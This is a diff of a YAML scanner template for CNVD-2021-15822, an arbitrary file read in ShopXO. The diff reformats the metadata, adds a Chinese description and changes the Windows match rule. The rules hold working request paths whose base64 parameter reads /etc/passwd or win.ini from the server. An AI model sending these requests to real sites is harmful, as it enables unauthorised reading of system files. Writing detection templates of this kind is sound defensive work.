@@ -1,22 +1,29 @@
 id: CNVD-2021-15822
 
 info:
-    name: ShopXO File Read
-    author: Print1n(http://print1n.top)
-    severity: high
-    reference:
-        - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
+  name: ShopXO 任意文件读取漏洞
+  author: Print1n
+  severity: high
+  description: |-
+    ShopXO 存在文件读取漏洞，攻击者可通过该漏洞读取系统敏感文件。
+  reference:
+    - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822
+  tags: shopxo,cnvd,cnvd2021,fileread
+  created: 2021/10/23
 
 rules:
-    Linux0:
-        request:
-            method: GET
-            path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    Windows0:
-        request:
-            method: GET
-            path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
-        expression: response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
+  Linux0:
+    request:
+      method: GET
+      path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  Windows0:
+    request:
+      method: GET
+      path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
+    expression: |
+      response.status == 200 &&
+      response.body.ibcontains(b"[fonts]") &&
+      response.body.ibcontains(b"[extensions]")
 expression: Linux0() || Windows0()
-
